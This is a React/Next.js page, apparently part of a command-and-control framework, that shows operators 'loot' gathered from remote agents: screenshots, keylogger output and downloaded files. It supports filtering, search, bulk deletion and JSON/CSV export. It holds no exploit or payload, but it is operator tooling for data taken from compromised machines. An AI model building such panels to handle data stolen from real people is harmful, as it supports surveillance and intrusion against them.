"use client";

import { useState, useCallback, useMemo, Suspense, useEffect } from "react";
import { useSearchParams } from "next/navigation";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { toast } from "sonner";
import { downloadText, downloadJSON } from "@/lib/download";
import { useI18n } from "@/lib/i18n";
import { formatTime } from "@/lib/utils";
import { safeHref, safeImageSrc } from "@/lib/safeUrl";
import { EmptyState, PageHeader, Pagination, StatusBadge, CopyButton } from "@/components/UI";
import { useConfirm } from "@/lib/hooks/useConfirm";
import { DataState } from "@/components/ui/data-state";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Checkbox } from "@/components/ui/checkbox";
import { Skeleton } from "@/components/ui/skeleton";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Label } from "@/components/ui/label";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Download, FileUp, Images, Keyboard, Terminal, Trash2, ChevronLeft, ChevronRight, X } from "lucide-react";
import { Accordion, AccordionItem, AccordionHeader, AccordionTrigger, AccordionPanel } from "@/components/ui/accordion";
import { LootScreenshotCard } from "./_components/LootScreenshotCard";
import KeylogContent from "./_components/KeylogContent";
import { useLootData } from "./_components/useLootData";
import type { LootTab } from "./_components/types";

function LootPage() {
  const { t } = useI18n();
  const searchParams = useSearchParams();
  const initialTab = (searchParams.get("tab") as LootTab) || "screenshots";
  const { data, loading, error, loadLoot } = useLootData();
  const [lbIndex, setLbIndex] = useState(-1);
  const [activeTab, setActiveTab] = useState<LootTab | null>(initialTab);
  const [agentFilter, setAgentFilter] = useState(searchParams.get("agent_id") || "");
  const { confirm, modal } = useConfirm();
  const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
  const [keylogSearch, setKeylogSearch] = useState("");
  const [screenshotPage, setScreenshotPage] = useState(1);
  const [keylogPage, setKeylogPage] = useState(1);
  const [downloadPage, setDownloadPage] = useState(1);

  const SCREENSHOT_PAGE_SIZE = 48;
  const KEYLOG_PAGE_SIZE = 20;
  const DOWNLOAD_PAGE_SIZE = 50;

  const filteredScreenshots = useMemo(() => data?.screenshots?.filter(s => !agentFilter || s.agent_id === agentFilter) || [], [data, agentFilter]);
  const filteredKeylogs = useMemo(() => (data?.keylog_tasks || []).filter(k => {
    if (agentFilter && k.agent_id !== agentFilter) return false;
    if (keylogSearch) {
      const q = keylogSearch.toLowerCase();
      const content = (k.result || k.error || "").toLowerCase();
      const agent = (k.agent?.hostname || k.hostname || k.agent_id || "").toLowerCase();
      if (!content.includes(q) && !agent.includes(q)) return false;
    }
    return true;
  }), [data, agentFilter, keylogSearch]);
  const filteredDownloads = useMemo(() => data?.download_tasks?.filter(d => !agentFilter || d.agent_id === agentFilter) || [], [data, agentFilter]);

  const visibleScreenshots = useMemo(() => {
    const totalPages = Math.max(1, Math.ceil(filteredScreenshots.length / SCREENSHOT_PAGE_SIZE));
    const page = Math.min(screenshotPage, totalPages);
    const start = (page - 1) * SCREENSHOT_PAGE_SIZE;
    return filteredScreenshots.slice(start, start + SCREENSHOT_PAGE_SIZE);
  }, [filteredScreenshots, screenshotPage]);

  const visibleKeylogs = useMemo(() => {
    const totalPages = Math.max(1, Math.ceil(filteredKeylogs.length / KEYLOG_PAGE_SIZE));
    const page = Math.min(keylogPage, totalPages);
    const start = (page - 1) * KEYLOG_PAGE_SIZE;
    return filteredKeylogs.slice(start, start + KEYLOG_PAGE_SIZE);
  }, [filteredKeylogs, keylogPage]);

  const visibleDownloads = useMemo(() => {
    const totalPages = Math.max(1, Math.ceil(filteredDownloads.length / DOWNLOAD_PAGE_SIZE));
    const page = Math.min(downloadPage, totalPages);
    const start = (page - 1) * DOWNLOAD_PAGE_SIZE;
    return filteredDownloads.slice(start, start + DOWNLOAD_PAGE_SIZE);
  }, [filteredDownloads, downloadPage]);

  const allAgents = [...new Set([
    ...(data?.screenshots?.map(s => s.agent_id) || []),
    ...(data?.keylog_tasks?.map(k => k.agent_id) || []),
    ...(data?.download_tasks?.map(d => d.agent_id) || []),
  ])];

  const toggleSelect = useCallback((id: string) => {
    setSelectedItems(prev => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
  }, []);

  const validTabs: LootTab[] = ["screenshots", "keylogs", "downloads"];
  const curTab: LootTab = activeTab && validTabs.includes(activeTab) ? activeTab : "screenshots";

  const toggleSelectAll = useCallback(() => {
    let items: string[] = [];
    if (curTab === "screenshots") items = filteredScreenshots.map(s => s.id);
    else if (curTab === "downloads") items = filteredDownloads.map(d => d.id);
    const allSelected = items.every(id => selectedItems.has(id));
    const next = new Set(selectedItems);
    if (allSelected) items.forEach(id => next.delete(id));
    else items.forEach(id => next.add(id));
    setSelectedItems(next);
  }, [curTab, filteredScreenshots, filteredDownloads, selectedItems]);

  const deleteSelected = useCallback(async () => {
    if (selectedItems.size === 0) return;
    if (!(await confirm({ message: t("loot.confirm_delete_selected", { count: selectedItems.size }) }))) return;
    try {
      await api.postJson(paths.loot.bulkDelete, { ids: [...selectedItems] });
      setSelectedItems(new Set());
      loadLoot();
    } catch (e) {
      toast.error(e instanceof Error ? e.message : t("loot.toast.delete_failed"));
    }
  }, [selectedItems, loadLoot, t, confirm]);

  const exportAll = (format: "json" | "csv" = "json") => {
    const exportData = {
      screenshots: filteredScreenshots,
      keylogs: filteredKeylogs,
      downloads: filteredDownloads,
    };
    if (format === "csv") {
      const rows: string[] = ["Type,Agent,Filename,Path,Created"];
      for (const s of filteredScreenshots) {
        rows.push(`screenshot,${s.agent_id},"${s.filename}","${s.path}",${s.created_at}`);
      }
      for (const k of filteredKeylogs) {
        rows.push(`keylog,${k.agent_id},"","","${k.created_at}"`);
      }
      for (const d of filteredDownloads) {
        rows.push(`download,${d.agent_id},"${d.command}","${d.result}",${d.created_at}`);
      }
      downloadText(rows.join("\n"), `loot-export-${new Date().toISOString().slice(0, 10)}.csv`, "text/csv");
    } else {
      downloadJSON(exportData, `loot-export-${new Date().toISOString().slice(0, 10)}.json`);
    }
  };

  const formatBytes = (str: string) => {
    const size = (str || "").length;
    if (size < 1024) return size + " B";
    return (size / 1024).toFixed(1) + " KB";
  };

  const lbScreenshots = filteredScreenshots;
  const lbCurrent = lbIndex >= 0 && lbIndex < lbScreenshots.length ? lbScreenshots[lbIndex] : null;
  const lbUrl = lbCurrent ? `/screenshots/${lbCurrent.path}` : "";

  useEffect(() => {
    if (lbIndex < 0) return;
    const handler = (e: KeyboardEvent) => {
      if (e.key === "Escape") setLbIndex(-1);
      else if (e.key === "ArrowLeft") setLbIndex((i) => Math.max(0, i - 1));
      else if (e.key === "ArrowRight") setLbIndex((i) => Math.min(lbScreenshots.length - 1, i + 1));
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [lbIndex, lbScreenshots.length]);

  const tabs: { key: LootTab; label: string; icon: React.ReactNode; count: number }[] = [
    { key: "screenshots", label: t("loot.screenshots_tab"), icon: <Images aria-hidden="true" className="w-4 h-4" />, count: filteredScreenshots.length },
    { key: "keylogs", label: t("loot.keylogs_tab"), icon: <Keyboard aria-hidden="true" className="w-4 h-4" />, count: filteredKeylogs.length },
    { key: "downloads", label: t("loot.downloads_tab"), icon: <Download aria-hidden="true" className="w-4 h-4" />, count: filteredDownloads.length },
  ];

  return (
    <div className="max-w-(--content-width) mx-auto pb-12 md:pb-0 animate-fade-slide-up">
      <PageHeader title={t("loot.page_title")} subtitle={t("loot.subtitle")}>
        <div className="flex items-center gap-2 flex-wrap">
          <Select value={agentFilter || "all"} onValueChange={(v) => { setAgentFilter(v === "all" ? "" : v ?? ""); setSelectedItems(new Set()); setScreenshotPage(1); setKeylogPage(1); setDownloadPage(1); }}>
            <SelectTrigger className="w-full sm:w-48" aria-label={t("loot.filter_agent_aria")}><SelectValue placeholder={t("loot.all_agents")} /></SelectTrigger>
            <SelectContent>
              <SelectItem value="all">{t("loot.all_agents")}</SelectItem>
              {allAgents.map(a => <SelectItem key={a} value={a}>{a.substring(0, 12)}</SelectItem>)}
            </SelectContent>
          </Select>
          <Button onClick={() => exportAll("json")} className="gap-1">
            <FileUp aria-hidden="true" className="w-4 h-4" /> {t("loot.export_json")}
          </Button>
          <Button variant="outline" onClick={() => exportAll("csv")} className="gap-1">
            <FileUp aria-hidden="true" className="w-4 h-4" /> {t("loot.export_csv")}
          </Button>
          {selectedItems.size > 0 && (
            <Button variant="destructive" onClick={deleteSelected} className="gap-1">
              <Trash2 aria-hidden="true" className="w-4 h-4" /> {t("loot.delete_selected", { count: selectedItems.size })}
            </Button>
          )}
        </div>
      </PageHeader>

      <DataState
        loading={loading}
        error={error}
        onRetry={loadLoot}
        loadingSkeleton={
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 p-4">
            {Array.from({ length: 8 }).map((_, i) => (
              <Skeleton key={i} className="rounded-xl h-24" />
            ))}
          </div>
        }
      >
      <Tabs value={curTab} onValueChange={(v) => { setActiveTab(v as LootTab); setSelectedItems(new Set()); setScreenshotPage(1); setKeylogPage(1); setDownloadPage(1); }}>
        <TabsList className="mb-4">
          {tabs.map(tab => (
            <TabsTrigger key={tab.key} value={tab.key} className="gap-2">
              {tab.icon}
              <span>{tab.label}</span>
              <Badge variant={curTab === tab.key ? "default" : "secondary"}>{tab.count}</Badge>
            </TabsTrigger>
          ))}
        </TabsList>

      <TabsContent value="screenshots">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold flex items-center gap-x-2">
              <Images aria-hidden="true" className="w-4 h-4" />
              <span>{t("loot.screenshots_title")}</span>
            </div>
            <div className="flex items-center gap-3">
              {filteredScreenshots.length > 0 && (
                <Label className="flex items-center gap-x-2 text-xs text-muted-foreground cursor-pointer">
                  <Checkbox checked={filteredScreenshots.length > 0 && filteredScreenshots.every(s => selectedItems.has(s.id))} onCheckedChange={toggleSelectAll} aria-label={t("loot.a11y_select_all")} />
                  {t("loot.select_all")}
                </Label>
              )}
              <span className="text-xs text-muted-foreground">{filteredScreenshots.length}</span>
            </div>
          </div>
          {filteredScreenshots.length > 0 ? (
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-3">
              {visibleScreenshots.map((s) => (
                <LootScreenshotCard
                  key={s.id}
                  screenshot={s}
                  index={filteredScreenshots.findIndex((item) => item.id === s.id)}
                  isSelected={selectedItems.has(s.id)}
                  onToggleSelect={toggleSelect}
                  onOpen={(i) => setLbIndex(i)}
                />
              ))}
            </div>
          ) : (
            <div className="text-center py-12 text-muted-foreground">
              <EmptyState icon={Images} title={t("loot.empty_screenshots")} />
            </div>
          )}
          {filteredScreenshots.length > SCREENSHOT_PAGE_SIZE && (
            <Pagination
              page={Math.min(screenshotPage, Math.ceil(filteredScreenshots.length / SCREENSHOT_PAGE_SIZE))}
              pageSize={SCREENSHOT_PAGE_SIZE}
              total={filteredScreenshots.length}
              onPageChange={setScreenshotPage}
            />
          )}
        </Card>
      </TabsContent>

      <TabsContent value="keylogs">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4 gap-2">
            <div className="font-semibold flex items-center gap-x-2">
              <Keyboard aria-hidden="true" className="w-4 h-4" />
              <span>{t("loot.keylogs_title")}</span>
            </div>
            <div className="flex items-center gap-2">
              <Input placeholder={t("loot.search_keylogs")} value={keylogSearch} onChange={e => { setKeylogSearch(e.target.value); setKeylogPage(1); }} className="hidden sm:block h-8 w-44 text-xs" />
              <span className="text-xs text-muted-foreground">{filteredKeylogs.length}</span>
            </div>
          </div>
          {filteredKeylogs.length > 0 ? (
            <div className="space-y-3">
              <Accordion>
                {visibleKeylogs.map(k => {
                  const agentName = k.agent?.hostname || k.hostname || k.agent_id;
                  const full = k.result || k.error;
                  const preview = full.split("\n").find(l => l.trim()) || "";
                  return (
                    <AccordionItem key={k.id} value={k.id} className="border border-border rounded-xl overflow-hidden mb-3">
                      <AccordionHeader className="bg-muted/50">
                        <AccordionTrigger className="px-4 py-2 hover:bg-muted/80 flex-1">
                          <div className="flex items-center gap-x-3 w-full min-w-0">
                            <Terminal aria-hidden="true" className="w-4 h-4 shrink-0" />
                            <span className="font-medium text-sm truncate">{agentName}</span>
                            <span className="font-mono text-xs text-muted-foreground truncate hidden md:inline">{preview}</span>
                            <span className="ml-auto text-xs text-muted-foreground shrink-0">{formatTime(k.created_at)}</span>
                          </div>
                        </AccordionTrigger>
                      </AccordionHeader>
                      <AccordionPanel>
                        <div className="flex items-center justify-between px-4 py-1.5 border-b border-border bg-muted/30">
                          <span className="text-xs text-muted-foreground">{t("loot.keylog")}</span>
                          <div className="flex items-center gap-1">
                            <CopyButton text={full} label={t("loot.keylog_copy")} size="icon-xs" />
                            <Button variant="ghost" size="sm" onClick={() => downloadText(full, `keylog-${agentName}-${k.id}.txt`)} className="text-xs h-auto p-1 text-primary" aria-label={t("common.download")}><Download aria-hidden="true" className="w-4 h-4" /></Button>
                          </div>
                        </div>
                        <div className="bg-background text-emerald-700 dark:text-emerald-300 font-mono text-xs p-4 max-h-[500px] overflow-y-auto whitespace-pre-wrap break-all">
                          <KeylogContent text={full} />
                        </div>
                      </AccordionPanel>
                    </AccordionItem>
                  );
                })}
              </Accordion>
            </div>
          ) : (
            <div className="text-center py-12 text-muted-foreground">
              <EmptyState icon={Keyboard} title={t("loot.empty_keylogs")} />
            </div>
          )}
          {filteredKeylogs.length > KEYLOG_PAGE_SIZE && (
            <Pagination
              page={Math.min(keylogPage, Math.ceil(filteredKeylogs.length / KEYLOG_PAGE_SIZE))}
              pageSize={KEYLOG_PAGE_SIZE}
              total={filteredKeylogs.length}
              onPageChange={setKeylogPage}
            />
          )}
        </Card>
      </TabsContent>

      <TabsContent value="downloads">
        <Card className="p-4 sm:p-5">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold flex items-center gap-x-2">
              <Download aria-hidden="true" className="w-4 h-4" />
              <span>{t("loot.downloads_title")}</span>
            </div>
            <span className="text-xs text-muted-foreground">{filteredDownloads.length}</span>
          </div>
          {filteredDownloads.length > 0 ? (
            <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>{t("loot.time")}</TableHead>
                  <TableHead>{t("loot.file_path")}</TableHead>
                  <TableHead>{t("loot.source")}</TableHead>
                  <TableHead>{t("loot.size")}</TableHead>
                  <TableHead>{t("loot.status")}</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {visibleDownloads.map(d => (
                  <TableRow key={d.id}>
                    <TableCell className="font-mono text-xs text-muted-foreground">{formatTime(d.created_at)}</TableCell>
                    <TableCell><span className="font-medium text-xs">{d.agent?.hostname || d.hostname || d.agent_id.substring(0, 8)}</span></TableCell>
                    <TableCell className="font-mono text-xs text-muted-foreground max-w-[200px] truncate">{d.command}</TableCell>
                    <TableCell className="font-mono text-xs text-muted-foreground max-w-[300px] truncate">{d.result || "-"}</TableCell>
                    <TableCell className="text-xs text-muted-foreground">{formatBytes(d.result || "")}</TableCell>
                    <TableCell><StatusBadge status={d.status} /></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
            </div>
          ) : (
            <EmptyState icon={Download} title={t("loot.empty_downloads")} />
          )}
          {filteredDownloads.length > DOWNLOAD_PAGE_SIZE && (
            <Pagination
              page={Math.min(downloadPage, Math.ceil(filteredDownloads.length / DOWNLOAD_PAGE_SIZE))}
              pageSize={DOWNLOAD_PAGE_SIZE}
              total={filteredDownloads.length}
              onPageChange={setDownloadPage}
            />
          )}
        </Card>
      </TabsContent>
      </Tabs>
      </DataState>

      {lbCurrent && (
        <Dialog open={true} onOpenChange={() => setLbIndex(-1)}>
          <DialogContent className="max-w-5xl bg-transparent border-0 p-0" showCloseButton={false}>
            <div className="absolute top-4 right-4 flex gap-2 z-10">
              <a href={safeHref(lbUrl)} download className="inline-flex items-center gap-1">
                <Button variant="secondary" className="gap-1"><Download aria-hidden="true" className="w-4 h-4" />{t("common.download")}</Button>
              </a>
              <Button variant="secondary" onClick={() => setLbIndex(-1)} className="w-10 h-10 p-0" aria-label={t("loot.close_screenshot")}>
                <X aria-hidden="true" className="w-4 h-4" />
              </Button>
            </div>
            {lbIndex > 0 && (
              <Button variant="secondary" onClick={() => setLbIndex((i) => Math.max(0, i - 1))} className="absolute left-3 top-1/2 -translate-y-1/2 w-10 h-10 p-0 rounded-full" aria-label={t("loot.lb_previous")}>
                <ChevronLeft aria-hidden="true" className="w-4 h-4" />
              </Button>
            )}
            {lbIndex < lbScreenshots.length - 1 && (
              <Button variant="secondary" onClick={() => setLbIndex((i) => Math.min(lbScreenshots.length - 1, i + 1))} className="absolute right-3 top-1/2 -translate-y-1/2 w-10 h-10 p-0 rounded-full" aria-label={t("loot.lb_next")}>
                <ChevronRight aria-hidden="true" className="w-4 h-4" />
              </Button>
            )}
            <div className="text-center text-xs text-white/80 bg-black/60 rounded-xl px-3 py-1.5 mb-2">
              {lbIndex + 1} / {lbScreenshots.length} · {lbCurrent.filename} · {formatTime(lbCurrent.created_at)}
            </div>
            <img src={safeImageSrc(lbUrl)} alt={lbCurrent.filename} className="max-w-[95vw] max-h-[90vh] object-contain rounded-xl shadow-2xl" loading="lazy" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </DialogContent>
        </Dialog>
      )}
      {modal}
    </div>
  );
}

export default function LootPageWrapper() {
  return (
    <Suspense fallback={null}>
      <LootPage />
    </Suspense>
  );
}


